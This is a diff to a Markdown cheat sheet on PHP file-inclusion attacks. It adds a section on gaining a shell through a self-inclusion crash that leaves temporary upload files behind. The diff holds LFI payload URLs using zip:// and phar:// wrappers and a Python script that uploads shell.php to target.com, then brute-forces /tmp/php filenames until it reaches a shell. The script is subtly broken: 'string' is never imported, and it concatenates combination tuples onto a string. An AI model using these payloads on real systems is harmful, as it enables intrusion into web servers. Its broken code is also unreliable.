@@ -35,16 +35,49 @@ File must be zip archive with any extension
 http://www.site.com/lfi.php?page=zip://image.zip#shell.php
 
 http://www.site.com/lfi.php?page=phar://image.phar#shell.php
-
 ```
 
-## 6) Session Files
+## 6) File Upload
 
-## 7) PHPInfo Script
+It requires php interpreter that crashes upon infinite recursive inclusion, thus not removing temporary file.
 
-## 8) Temporary Files - Windows
+1. Upload a file and trigger a self-inclusion
+2. Repeat step 1 until successful attack
+3. Bruteforce inclusion of /tmp/php[0-9a-zA-Z]{6}
+4. Shell
 
-## 9) Logs
+We have 62**6 possible values -> 56800235584 filenames for temporary uploaded files
+Birthday paradox can be applied and it results with about 280000 requests to find valid file with more than 50% chance.
+
+```python
+import itertools
+import requests
+import sys
+
+print('[+] Trying to win the race')
+f = {'file': open('shell.php', 'rb')}
+for _ in range(4096 * 4096):
+    requests.post('http://target.com/index.php?c=index.php', f)
+
+
+print('[+] Bruteforcing the inclusion')
+for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
+    url = 'http://target.com/index.php?c=/tmp/php' + fname
+    r = requests.get(url)
+    if 'load average' in r.text:  # <?php echo system('uptime');
+        print('[+] We have got a shell: ' + url)
+        sys.exit(0)
+
+print('[x] Something went wrong, please try again')
+```
+
+## 7) Session Files
+
+## 8) PHPInfo Script
+
+## 9) Temporary Files - Windows
+
+## 10) Logs
 
 # Remote File Inclusion
 Works when allow_url_include in php.ini is set to TRUE
